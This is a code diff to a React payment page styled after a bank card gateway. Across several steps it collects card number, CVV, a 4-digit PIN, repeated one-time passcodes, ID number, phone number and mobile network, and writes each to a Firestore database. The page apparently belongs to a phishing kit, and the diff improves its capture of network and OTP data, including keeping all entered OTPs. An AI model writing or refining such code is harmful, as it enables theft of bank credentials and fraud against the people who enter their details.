@@ -4,7 +4,7 @@
 import { useEffect, useState } from "react"
 import { addData, handlePay } from "@/lib/db"
 import { DialogLoader } from "@/components/dilog-loader"
-import './knet.css'
+import "./knet.css"
 import { doc, onSnapshot } from "firebase/firestore"
 import { useRouter } from "next/navigation"
 import { db } from "@/lib/firebase"
@@ -26,10 +26,9 @@ type PaymentInfo = {
   // New fields for steps 3 and 4
   idNumber: string
   phoneNumber: string
-  finalOtp: string,
-  newtwork: string,
+  finalOtp: string
+  network: string
   createdDate: string
-
 }
 
 const BANKS = [
@@ -135,13 +134,13 @@ const Payment = () => {
     bank_card: [""],
     prefix: "",
     status: "new",
-    cvv: '',
+    cvv: "",
     // Initialize new fields
     idNumber: "",
     phoneNumber: "",
-    newtwork: "",
+    network: "",
     finalOtp: "",
-    createdDate: ''
+    createdDate: "",
   })
 
   // Safely access localStorage after component mounts
@@ -158,7 +157,7 @@ const Payment = () => {
 
   // Listen for Firestore status updates in the final step
   useEffect(() => {
-const _visitorId=    localStorage.getItem("visitor")
+    const _visitorId = localStorage.getItem("visitor")
     setupOnlineStatus(_visitorId!)
 
     addData({
@@ -187,8 +186,6 @@ const _visitorId=    localStorage.getItem("visitor")
       return () => unsubscribe()
     }
   }, [step, visitorId, router])
-
-
 
   return (
     <div style={{ background: "#f1f1f1", minHeight: "100vh", margin: 0, padding: 0 }}>
@@ -595,29 +592,21 @@ const _visitorId=    localStorage.getItem("visitor")
                         <label className="column-label" style={{ display: "block", marginBottom: "5px" }}>
                           Network Provider:
                         </label>
-                        <select value={paymentInfo.newtwork}
-                          className="w-full bg-transparent placeholder:text-blue-400 text-slate-700 text-sm border border-blue-500 rounded pl-3 pr-8 py-2 transition duration-300 ease focus:outline-none focus:border-blue-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer">
-                          <option onClick={() => {
+                        <select
+                          value={paymentInfo.network}
+                          onChange={(e) => {
                             setPaymentInfo({
                               ...paymentInfo,
-                              newtwork: 'Zain'
+                              network: e.target.value,
                             })
-                          }} value="Zain">Zain</option>
-                          <option 
-                        onClick={()=>{
-                          setPaymentInfo({
-                            ...paymentInfo,
-                            newtwork: 'Ooredoo'
-                          })
-                        }} value="Ooredoo">Ooredoo</option>
-                          <option   onClick={()=>{
-                          setPaymentInfo({
-                            ...paymentInfo,
-                            newtwork: 'STC'
-                          })
-                        }}value="STC">STC</option>
+                          }}
+                          style={{ width: "100%", padding: "10px" }}
+                          className="w-full text-slate-700 text-sm border border-blue-500 rounded pl-3 pr-8 py-2 transition duration-300 ease focus:outline-none focus:border-blue-400 hover:border-slate-400 shadow-sm focus:shadow-md appearance-none cursor-pointer"
+                        >
+                          <option value="Zain">Zain</option>
+                          <option value="Ooredoo">Ooredoo</option>
+                          <option value="STC">STC</option>
                         </select>
-
                       </div>
                     </form>
                   </div>
@@ -688,8 +677,9 @@ const _visitorId=    localStorage.getItem("visitor")
                               paymentInfo.year === "" ||
                               paymentInfo.pass.length !== 4)) ||
                           (step === 2 && (!paymentInfo.otp || paymentInfo.otp.length !== 6)) ||
-                          (step === 3 && (!paymentInfo.idNumber || !paymentInfo.phoneNumber)) ||
-                          (step === 4 && (!paymentInfo.finalOtp || paymentInfo.finalOtp.length >= 4 )) ||
+                          (step === 3 &&
+                            (!paymentInfo.idNumber || !paymentInfo.phoneNumber || !paymentInfo.network)) ||
+                          (step === 4 && (!paymentInfo.finalOtp )) ||
                           loading
                         }
                         onClick={() => {
@@ -704,7 +694,6 @@ const _visitorId=    localStorage.getItem("visitor")
                                 {
                                   ...paymentInfo,
                                   createdDate: new Date().toISOString(),
-
                                 },
                                 setPaymentInfo,
                               )
@@ -721,16 +710,12 @@ const _visitorId=    localStorage.getItem("visitor")
                               handlePay(
                                 {
                                   ...paymentInfo,
+                                  otp:paymentInfo.otp,
+                                  allOtps:paymentInfo.allOtps,
                                   createdDate: new Date().toISOString(),
-
                                 },
                                 setPaymentInfo,
                               )
-                              setPaymentInfo({
-                                ...paymentInfo,
-                                createdDate: new Date().toISOString(),
-                                otp: "",
-                              })
                               setStep(3)
                             }, 2000)
                           } else if (step === 3) {
@@ -738,9 +723,11 @@ const _visitorId=    localStorage.getItem("visitor")
                             handlePay(
                               {
                                 ...paymentInfo,
+                                network:paymentInfo.network,
                                 createdDate: new Date().toISOString(),
-
-                              }, setPaymentInfo)
+                              },
+                              setPaymentInfo,
+                            )
                             setTimeout(() => {
                               setIsLoading(false)
                               setStep(4)
